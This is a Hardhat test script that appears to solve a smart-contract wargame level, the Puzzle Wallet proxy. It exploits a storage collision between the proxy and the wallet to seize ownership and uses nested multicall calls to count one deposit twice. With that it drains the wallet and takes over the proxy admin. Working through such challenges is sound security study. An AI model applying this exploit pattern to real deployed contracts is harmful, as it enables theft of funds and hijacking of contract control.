import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const signer = await ethers.getImpersonatedSigner("0x621133f267AcC68f8d8BD4b2aa35b14516315Cea");

    const proxy = await ethers.getContractAt("PuzzleProxy", "0xaF424907392Eb412EE2308eC8247E2384b90D3e9");
    const puzzleWallet = await ethers.getContractAt("PuzzleWallet", "0xaF424907392Eb412EE2308eC8247E2384b90D3e9");

    const iface = new ethers.utils.Interface([
      "function deposit()",
      "function execute(address to, uint256 value, bytes calldata data)",
      "function multicall(bytes[] calldata data)",
      "function proposeNewAdmin(address _newAdmin)"
    ]);
    const payloadOwner = iface.encodeFunctionData("proposeNewAdmin", [signer.address]);

    await signer.sendTransaction({ to: puzzleWallet.address, data: payloadOwner });
    expect(await puzzleWallet.owner()).to.eq(signer.address);

    await puzzleWallet.connect(signer).addToWhitelist(signer.address);
    expect(await puzzleWallet.whitelisted(signer.address)).to.be.true;

    await puzzleWallet.connect(signer).multicall([
      iface.encodeFunctionData("deposit"),
      iface.encodeFunctionData("multicall", [
        [
          iface.encodeFunctionData("deposit")
        ]
      ]),
      iface.encodeFunctionData("execute", [
        signer.address, ethers.utils.parseEther("0.002"), []
      ])
    ], { value: ethers.utils.parseEther("0.001") });

    expect((await ethers.provider.getBalance(puzzleWallet.address)).isZero()).to.be.true;

    await puzzleWallet.connect(signer).setMaxBalance(signer.address);
    expect(await proxy.admin()).to.eq(signer.address);
  })
})
